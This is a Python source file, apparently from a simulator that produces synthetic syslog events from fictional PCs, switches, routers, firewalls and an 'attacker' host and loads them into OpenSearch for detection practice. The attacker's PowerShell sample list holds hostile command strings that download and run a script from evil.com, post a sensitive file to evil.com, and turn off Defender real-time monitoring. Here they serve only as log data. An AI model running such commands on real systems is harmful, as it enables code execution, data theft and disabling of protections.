                    category="PC",
                    log_format="syslog",
                    os="Windows",
                    domain="telecom.technology",
                    asset_number=f"IN-{random.randint(1000, 9999)}{random.randint(1000, 9999)}"
                ))
            mac_address_list.append(users[i].get_mac_addr())
            ip_address_list.append(users[i].get_ip_addr())
        return {
            "users": users,
            "ip": ip_address_list,
            "mac": mac_address_list
        }

    elif category == {"Switch": None}:
        for i in range(count_users):
            users.append(
                entity.Switch(
                    hostname=f"SW-{random.randint(2,30)}",
                    ip_addr=generation_ip_address(header, subnetwork, tail, ip_address_list),
                    mac_addr=generation_mac_address(),
                    category="Switch",
                    log_format="systemd",
                    os="IOS",
                    domain="telecom.technology",
                    asset_number=f"IN-{random.randint(1000, 9999)}{random.randint(1000, 9999)}"
                ))
            mac_address_list.append(users[i].get_mac_addr())
            ip_address_list.append(users[i].get_ip_addr())
        return {
            "users": users,
            "ip": ip_address_list,
            "mac": mac_address_list
        }

    elif category == {"Router": None}:
        for i in range(count_users):
            users.append(
                entity.Router(
                    hostname=f"RT-{i + 1}",
                    ip_addr=generation_ip_address(header, subnetwork, tail, ip_address_list),
                    mac_addr=generation_mac_address(),
                    category="Router",
                    log_format="systemd",
                    os="IOS",
                    domain="telecom.technology",
                    asset_number=f"IN-{random.randint(1000, 9999)}{random.randint(1000, 9999)}"
                ))
            mac_address_list.append(users[i].get_mac_addr())
            ip_address_list.append(users[i].get_ip_addr())
        return {
            "users": users,
            "ip": ip_address_list,
            "mac": mac_address_list
        }

    elif category == {"Firewall": None}:
        for i in range(count_users):
            users.append(
                entity.Firewall(
                    hostname=f"FW-{i + 1}",
                    ip_addr=generation_ip_address(header, subnetwork, tail, ip_address_list),
                    mac_addr=generation_mac_address(),
                    category="Firewall",
                    log_format="systemd",
                    os="IOS",
                    domain="telecom.technology",
                    asset_number=f"IN-{random.randint(1000, 9999)}{random.randint(1000, 9999)}"
                ))
            mac_address_list.append(users[i].get_mac_addr())
            ip_address_list.append(users[i].get_ip_addr())
        return {
            "users": users,
            "ip": ip_address_list,
            "mac": mac_address_list
        }

    elif category == {"Attacker": None}:
        for i in range(count_users):
            users.append(
                entity.Attacker(
                    hostname=f"PC-{random.randint(2,30)}",
                    ip_addr=generation_ip_address(header, subnetwork, tail, ip_address_list),
                    mac_addr=generation_mac_address(),
                    category="PC",
                    log_format="syslog",
                    os="Linux",
                    domain="telecom.technology",
                    asset_number=f"IN-{random.randint(1000, 9999)}{random.randint(1000, 9999)}"
                )
            )
            mac_address_list.append(users[i].get_mac_addr())
            ip_address_list.append(users[i].get_ip_addr())

        return {
            "users": users,
            "ip": ip_address_list,
            "mac": mac_address_list
        }

    else:
        return {
            "user": [],
            "ip": [],
            "mac": []
        }



def generator_protocols(client, index_name, users, list_ip_addr, list_mac_addr, stop_event, attacker_code, ui : MainWindow):

    # --- ATTENTION! --- USE IN INFINITELY LOOP! --- ONE-TIME ACTION! ---

    operations_index = 1

    while not stop_event.is_set():
        # Случайная задержка
        delay = random.uniform(0.1, 5)
        sleep(delay)

        if stop_event.is_set():
            break

        user = random.choice(users)
        operation = random.randint(1, 21)

        if type(user) == entity.PersonalComputerLinux or type(user) == entity.PersonalComputerWindows:
            if type(user) == entity.PersonalComputerLinux:
                print("Linux -> ", end="")
            if type(user) == entity.PersonalComputerWindows:
                print("Windows -> ", end="")
            if operation == 1:
                print(f"{operations_index}, {operation} | auth_info" , end=" > ")
                logs = (user.auth_info_json(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 2:
                print(f"{operations_index}, {operation} | auth_warning", end=" > ")
                logs = (user.auth_warning_json(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 3:
                print(f"{operations_index}, {operation} | auth_crit" , end=" > ")
                logs = (user.auth_crit_json(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 4:
                print(f"{operations_index}, {operation} | start_process_info" , end=" > ")
                logs = (user.start_process_info_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 5:
                print(f"{operations_index}, {operation} | start_process_warning" , end=" > ")
                logs = (user.start_process_warning_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 6:
                print(f"{operations_index}, {operation} | start_process_debug" , end=" > ")
                logs = (user.start_process_debug_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 7:
                print(f"{operations_index}, {operation} | open_file_info" , end=" > ")
                logs = (user.open_file_info_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 8:
                print(f"{operations_index}, {operation} | open_file_warning" , end=" > ")
                logs = (user.open_file_warning_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 9:
                print(f"{operations_index}, {operation} | open_file_crit" , end=" > ")
                logs = (user.open_file_crit_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 10:
                print(f"{operations_index}, {operation} | network_activity_info" , end=" > ")
                logs = (user.network_activity_info_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 11:
                print(f"{operations_index}, {operation} | network_activity_warning" , end=" > ")
                logs = (user.network_activity_warning_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 12:
                print(f"{operations_index}, {operation} | network_activity_debug" , end=" > ")
                logs = (user.network_activity_debug_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 13:
                print(f"{operations_index}, {operation} | edit_policies_notice" , end=" > ")
                logs = (user.edit_policies_notice_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 14:
                print(f"{operations_index}, {operation} | edit_policies_warning" , end=" > ")
                logs = (user.edit_policies_warning_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 15:
                print(f"{operations_index}, {operation} | edit_policies_info" , end=" > ")
                logs = (user.edit_policies_info_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 16:
                print(f"{operations_index}, {operation} | remote_control_info" , end=" > ")
                logs = (user.remote_control_info_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 17:
                print(f"{operations_index}, {operation} | remote_control_warning" , end=" > ")
                logs = (user.remote_control_warning_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 18:
                print(f"{operations_index}, {operation} | remote_control_alert" , end=" > ")
                logs = (user.remote_control_alert_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 19:
                print(f"{operations_index}, {operation} | update_system_info" , end=" > ")
                logs = (user.update_system_info_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 20:
                print(f"{operations_index}, {operation} | update_system_err" , end=" > ")
                logs = (user.update_system_err_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 21:
                print(f"{operations_index}, {operation} | update_system_notice" , end=" > ")
                logs = (user.update_system_notice_json())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1

        elif type(user) == entity.Switch:
            print("Switch -> ", end="")
            if operation == 1:
                print(f"{operations_index}, {operation} | change_status_port_info" , end=" > ")
                logs = (user.change_status_port_info())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 2:
                print(f"{operations_index}, {operation} | change_status_port_warning" , end=" > ")
                logs = (user.change_status_port_warning())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 3:
                print(f"{operations_index}, {operation} | change_status_port_crit" , end=" > ")
                logs = (user.change_status_port_crit())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 4:
                print(f"{operations_index}, {operation} | learn_mac_addr_info" , end=" > ")
                logs = (user.learn_mac_addr_info(list_mac_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 5:
                print(f"{operations_index}, {operation} | learn_mac_addr_warning" , end=" > ")
                logs = (user.learn_mac_addr_warning(list_mac_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 6:
                print(f"{operations_index}, {operation} | learn_mac_addr_debug" , end=" > ")
                logs = (user.learn_mac_addr_debug(list_mac_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 7:
                print(f"{operations_index}, {operation} | violation_port_security_warning" , end=" > ")
                logs = (user.violation_port_security_warning())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 8:
                print(f"{operations_index}, {operation} | violation_port_security_crit" , end=" > ")
                logs = (user.violation_port_security_crit())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 9:
                print(f"{operations_index}, {operation} | violation_port_security_alert" , end=" > ")
                logs = (user.violation_port_security_alert())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 10:
                print(f"{operations_index}, {operation} | stp_event_info" , end=" > ")
                logs = (user.stp_event_info())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 11:
                print(f"{operations_index}, {operation} | stp_event_warning" , end=" > ")
                logs = (user.stp_event_warning())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 12:
                print(f"{operations_index}, {operation} | stp_event_crit" , end=" > ")
                logs = (user.stp_event_crit())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 13:
                print(f"{operations_index}, {operation} | duplex_error_warning" , end=" > ")
                logs = (user.duplex_error_warning())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 14:
                print(f"{operations_index}, {operation} | duplex_error_err" , end=" > ")
                logs = (user.duplex_error_err())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 15:
                print(f"{operations_index}, {operation} | duplex_error_crit" , end=" > ")
                logs = (user.duplex_error_crit())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 16:
                print(f"{operations_index}, {operation} | vlan_event_info" , end=" > ")
                logs = (user.vlan_event_info())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 17:
                print(f"{operations_index}, {operation} | vlan_event_info" , end=" > ")
                logs = (user.vlan_event_warning())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 18:
                print(f"{operations_index}, {operation} | vlan_event_debug" , end=" > ")
                logs = (user.vlan_event_debug())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 19:
                print(f"{operations_index}, {operation} | auth_802_1x_info" , end=" > ")
                logs = (user.auth_802_1x_info(list_mac_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 20:
                print(f"{operations_index}, {operation} | auth_802_1x_warning" , end=" > ")
                logs = (user.auth_802_1x_warning(list_mac_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 21:
                print(f"{operations_index}, {operation} | auth_802_1x_alert" , end=" > ")
                logs = (user.auth_802_1x_alert(list_mac_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1

        elif type(user) == entity.Router:
            print("Router -> ", end="")
            if operation == 1:
                print(f"{operations_index}, {operation} | change_status_int_info" , end=" > ")
                logs = (user.change_status_int_info())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 2:
                print(f"{operations_index}, {operation} | change_status_int_warning" , end=" > ")
                logs = (user.change_status_int_warning())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 3:
                print(f"{operations_index}, {operation} | change_status_int_crit" , end=" > ")
                logs = (user.change_status_int_crit())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 4:
                print(f"{operations_index}, {operation} | change_roadmap_info" , end=" > ")
                logs = (user.change_roadmap_info(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 5:
                print(f"{operations_index}, {operation} | change_roadmap_warning" , end=" > ")
                logs = (user.change_roadmap_warning(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 6:
                print(f"{operations_index}, {operation} | change_roadmap_alert" , end=" > ")
                logs = (user.change_roadmap_alert())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 7:
                print(f"{operations_index}, {operation} | dynamic_routing_event_info" , end=" > ")
                logs = (user.dynamic_routing_event_info())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 8:
                print(f"{operations_index}, {operation} | dynamic_routing_event_warning" , end=" > ")
                logs = (user.dynamic_routing_event_warning(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 9:
                print(f"{operations_index}, {operation} | dynamic_routing_event_crit" , end=" > ")
                logs = (user.dynamic_routing_event_crit())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 10:
                print(f"{operations_index}, {operation} | acl_activity_info" , end=" > ")
                logs = (user.acl_activity_info(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 11:
                print(f"{operations_index}, {operation} | acl_activity_warning" , end=" > ")
                logs = (user.acl_activity_warning(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 12:
                print(f"{operations_index}, {operation} | acl_activity_debug" , end=" > ")
                logs = (user.acl_activity_debug())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 13:
                print(f"{operations_index}, {operation} | nat_event_info" , end=" > ")
                logs = (user.nat_event_info(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 14:
                print(f"{operations_index}, {operation} | nat_event_warning" , end=" > ")
                logs = (user.nat_event_warning(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 15:
                print(f"{operations_index}, {operation} | nat_event_debug" , end=" > ")
                logs = (user.nat_event_debug(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 16:
                print(f"{operations_index}, {operation} | icmp_message_info" , end=" > ")
                logs = (user.icmp_message_info(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 17:
                print(f"{operations_index}, {operation} | icmp_message_warning" , end=" > ")
                logs = (user.icmp_message_warning(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 18:
                print(f"{operations_index}, {operation} | icmp_message_debug" , end=" > ")
                logs = (user.icmp_message_debug(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 19:
                print(f"{operations_index}, {operation} | violation_traffic_info" , end=" > ")
                logs = (user.violation_traffic_info(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 20:
                print(f"{operations_index}, {operation} | violation_traffic_warning" , end=" > ")
                logs = (user.violation_traffic_warning())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif operation == 21:
                print(f"{operations_index}, {operation} | violation_traffic_debug" , end=" > ")
                logs = (user.violation_traffic_debug())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1

        elif type(user) == entity.Firewall:
            print("Firewall -> ", end="")
            if (operation % 10) == 1 or operation == 1:
                print(f"{operations_index}, {operation} | allow_traffic_info" , end=" > ")
                logs = (user.allow_traffic_info(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif (operation % 10) == 2 or operation == 2:
                print(f"{operations_index}, {operation} | allow_traffic_debug" , end=" > ")
                logs = (user.allow_traffic_debug(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif (operation % 10) == 3 or operation == 3:
                print(f"{operations_index}, {operation} | lock_traffic_warning" , end=" > ")
                logs = (user.lock_traffic_warning(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif (operation % 10) == 4 or operation == 4:
                print(f"{operations_index}, {operation} | lock_traffic_alert" , end=" > ")
                logs = (user.lock_traffic_alert(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif (operation % 10) == 5 or operation == 5:
                print(f"{operations_index}, {operation} | lock_traffic_debug" , end=" > ")
                logs = (user.lock_traffic_debug())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif (operation % 10) == 6 or operation == 6:
                print(f"{operations_index}, {operation} | change_session_info_connect" , end=" > ")
                logs = (user.change_session_info_connect(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif (operation % 10) == 7 or operation == 7:
                print(f"{operations_index}, {operation} | change_session_info_breakup" , end=" > ")
                logs = (user.change_session_info_breakup(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif (operation % 10) == 8 or operation == 8:
                print(f"{operations_index}, {operation} | change_session_debug" , end=" > ")
                logs = (user.change_session_debug(list_ip_addr))
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif (operation % 10) == 9 or operation == 9:
                print(f"{operations_index}, {operation} | vpn_tunnel_info" , end=" > ")
                logs = (user.vpn_tunnel_info())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1
            elif (operation % 10) == 0 or operation == 10:
                print(f"{operations_index}, {operation} | vpn_tunnel_warning" , end=" > ")
                logs = (user.vpn_tunnel_warning())
                network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                operations_index += 1

        # --- ATTACKER ---

        elif type(user) == entity.Attacker:
            try:
                if attacker_code == 1:
                    print(f"{operations_index}, {attacker_code} | ssh_bruteforce", end=" > ")
                    logs = user.ssh_bruteforce(random.choice(list_ip_addr))
                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                    ui.buffer_log(data=logs, index=operations_index)
                    operations_index += 1
                elif attacker_code == 2:
                    print(f"{operations_index}, {attacker_code} | rdp_bruteforce", end=" > ")
                    logs = user.rdp_bruteforce(random.choice(list_ip_addr))
                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                    ui.buffer_log(data=logs, index=operations_index)
                    operations_index += 1
                elif attacker_code == 3:
                    print(f"{operations_index}, {attacker_code} | data_exfiltration", end=" > ")
                    logs = user.data_exfiltration(random.choice(list_ip_addr),exfiltrated_data_size_bytes=random.choice(["200 MB", "1.2 GB", "150 MB", "96.8 MB", "3 GB", "25 GB", "200 KB", "1000 GB"]))
                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                    ui.buffer_log(data=logs, index=operations_index)
                    operations_index += 1
                elif attacker_code == 4:
                    print(f"{operations_index}, {attacker_code} | living_off_the_land_powershell", end=" > ")
                    logs = user.living_off_the_land_powershell(target_command = random.choice([
        "Get-Process",
        "Get-Service | Where-Object {$_.Status -eq 'Running'}",
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
        "Invoke-WebRequest -Uri http://evil.com/exfil -Method POST -Body (Get-Content C:\\sensitive_data.txt)",
        "Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address",
        "Get-LocalUser",
        "Get-EventLog -LogName Security -Newest 10",
        "Get-NetFirewallRule -Enabled True -Action Allow",
        "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Start-Process -FilePath 'C:\\temp\\malware.exe'",
        "Enable-PSRemoting -Force",
        "Get-ADComputer -Filter *",
        "Set-MpPreference -DisableRealtimeMonitoring $true"
    ]))
                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                    ui.buffer_log(data=logs, index=operations_index)
                    operations_index += 1
                elif attacker_code == 5:
                    print(f"{operations_index}, {attacker_code} | living_off_the_land_wmi", end=" > ")
                    logs = user.living_off_the_land_wmi(target_wmi_query = random.choice([
        "SELECT * FROM Win32_Process WHERE Name='cmd.exe'",  # Поиск активных cmd-сессий
        "SELECT * FROM Win32_Service WHERE State='Running' AND Name LIKE '%svchost%'",  # Сбор информации о системных сервисах
        "SELECT Name, ProcessId FROM Win32_Process WHERE ExecutablePath LIKE '%\\temp\\%'",  # Поиск процессов из временных папок
        "SELECT * FROM Win32_LogonSession WHERE LogonType=3",  # Поиск сетевых сессий (вход через сеть)
        "SELECT * FROM Win32_UserAccount WHERE Name='Administrator'",  # Проверка наличия администратора
        "SELECT IPAddress, DefaultIPGateway FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE",  # Сбор сетевой конфигурации
        "SELECT * FROM CIM_DataFile WHERE Name LIKE 'C:\\\\Users\\\\%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent\\\\%'",  # Поиск недавних файлов
        "SELECT CommandLine FROM Win32_Process WHERE Name='powershell.exe'",  # Получение командной строки PowerShell (для детектирования вредоносного кода)
        "SELECT * FROM Win32_PnPEntity WHERE Caption LIKE '%USB%'",  # Обнаружение подключенных USB-устройств
        "SELECT * FROM Win32_Share WHERE Name='C$' OR Name='ADMIN$'",  # Поиск административных общих ресурсов
        "SELECT * FROM Win32_StartupCommand WHERE Location='HKLM' OR Location='HKCU'",  # Поиск автозагрузки (persistent backdoor)
        "SELECT * FROM Win32_TerminalServiceSetting WHERE AllowTSConnections=1",  # Проверка включенного RDP
        "SELECT * FROM Win32_ComputerSystem WHERE DomainRole > 1",  # Определение, является ли хост контроллером домена
        "SELECT * FROM Win32_LogicalDisk WHERE DriveType=3",  # Перечисление локальных дисков
        "SELECT * FROM Win32_Printer WHERE Shared=TRUE",  # Поиск общих принтеров (возможная точка атаки)
        "SELECT Name, Path FROM Win32_Service WHERE StartMode='Auto' AND State='Running'",  # Все автозапускаемые службы
        "SELECT * FROM Win32_ComputerSystemProduct WHERE IdentifyingNumber != ''",  # Получение серийного номера машины
        "SELECT * FROM Win32_OperatingSystem WHERE Caption LIKE '%Server%'",  # Определение ОС сервера
        "SELECT * FROM Win32_NTEventLogFile WHERE LogFileName='Security'",  # Проверка доступности журнала безопасности
        "SELECT * FROM Win32_SystemDriver WHERE State='Running' AND Name LIKE '%vss%' OR Name LIKE '%shadow%'"  # Поиск служб теневого копирования (для обхода защиты)
    ]))
                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                    ui.buffer_log(data=logs, index=operations_index)
                    operations_index += 1
                elif attacker_code == 6:
                    print(f"{operations_index}, {attacker_code} | cam_overflow", end=" > ")
                    trust_ip = []
                    for ip in list_ip_addr:
                        if "192.168." in ip  and ".1" in ip:
                            trust_ip.append(ip)
                    logs = user.cam_overflow(random.choice(trust_ip), switch_port = random.randint(20, 25000))
                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                    ui.buffer_log(data=logs, index=operations_index)
                    operations_index += 1
                elif attacker_code == 7:
                    print(f"{operations_index}, {attacker_code} | unauthorized_acl_modification", end=" > ")
                    trust_ip = []
                    for ip in list_ip_addr:
                        if "10." in ip and ".1" in ip:
                            trust_ip.append(ip)
                    logs = user.unauthorized_acl_modification(random.choice(trust_ip), target_acl_name = random.choice([
        "BLOCK_MALICIOUS_IPS",           # Блокировка известных вредоносных IP
        "ALLOW_WEB_TRAFFIC",             # Разрешение HTTP/HTTPS
        "DENY_PRIVATE_SUBNETS",          # Запрет трафика в приватные подсети извне
        "PERMIT_SSH_FROM_MGMT",          # Разрешение SSH только с управляющей подсети
        "RESTRICT_FILE_SHARING",         # Блокировка SMB/NetBIOS
        "ACL_INTERNET_ACCESS",           # Общий ACL для доступа в интернет
        "BLOCK_TOR_AND_PROXY",           # Запрет трафика к Tor и прокси-серверам
        "ALLOW_DNS_QUERIES",             # Разрешение DNS-запросов
        "DENY_ICMP_FLOOD",               # Ограничение ICMP для защиты от флуда
        "PERMIT_BACKUP_TRAFFIC",         # Разрешение трафика для систем резервного копирования
        "ACL-101",                       # Стандартное числовое имя ACL (Cisco)
        "INSIDE_TO_DMZ",                 # Контроль доступа из внутренней сети в DMZ
        "DENY_INTERNAL_SCANNING",        # Запрет внутреннего сканирования портов
        "ALLOW_CLOUD_SYNC",              # Разрешение трафика для облачных сервисов (Dropbox, OneDrive)
        "BLOCK_CRYPTO_MINERS",           # Блокировка известных пулов майнинга
        "PERMIT_NTP_SYNC",               # Разрешение NTP-трафика
        "DENY_ANONYMOUS_TRAFFIC",        # Запрет трафика без идентификации
        "ACL-GUEST-WIFI",                # Ограничения для гостевой Wi-Fi сети
        "ALLOW_MONITORING_TOOLS",        # Разрешение SNMP, NetFlow и пр.
        "BLOCK_ADULT_CONTENT"            # Фильтрация трафика к нежелательному контенту
    ]))
                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                    ui.buffer_log(data=logs, index=operations_index)
                    operations_index += 1
                elif attacker_code == 8:
                    print(f"{operations_index}, {attacker_code} | stp_root_bridge_hijacking", end=" > ")
                    trust_ip = []
                    for ip in list_ip_addr:
                        if "192.168." in ip  and ".1" in ip:
                            trust_ip.append(ip)
                    logs = user.stp_root_bridge_hijacking(random.choice(trust_ip))
                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                    ui.buffer_log(data=logs, index=operations_index)
                    operations_index += 1
                elif attacker_code == 9:
                    print(f"{operations_index}, {attacker_code} | rogue_dhcp_server", end=" > ")
                    logs = user.rogue_dhcp_server(random.choice([1,2,3]))
                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                    ui.buffer_log(data=logs, index=operations_index)
                    operations_index += 1
                elif attacker_code == 10:
                    print(f"{operations_index}, {attacker_code} | route_injection", end=" > ")
                    trust_ip = []
                    for ip in list_ip_addr:
                        if "10." in ip and ".1" in ip:
                            trust_ip.append(ip)
                    logs = user.route_injection(random.choice(trust_ip))
                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                    ui.buffer_log(data=logs, index=operations_index)
                    operations_index += 1
                elif attacker_code == 11:
                    print(f"{operations_index}, {attacker_code} | snmp_bruteforce", end=" > ")
                    trust_ip = []
                    for ip in list_ip_addr:
                        if "10." in ip and ".1" in ip:
                            trust_ip.append(ip)
                    logs = user.snmp_bruteforce(random.choice(trust_ip))
                    network.insert_index_opensearch(client=client, index_name=index_name, index_data=logs)
                    ui.buffer_log(data=logs, index=operations_index)
                    operations_index += 1
            except Exception as e:
                print(f"Error: {e}")

        else:
            print("Stop!")
            break


def unit_test():
    pass



if __name__ == "__main__":
    unit_test()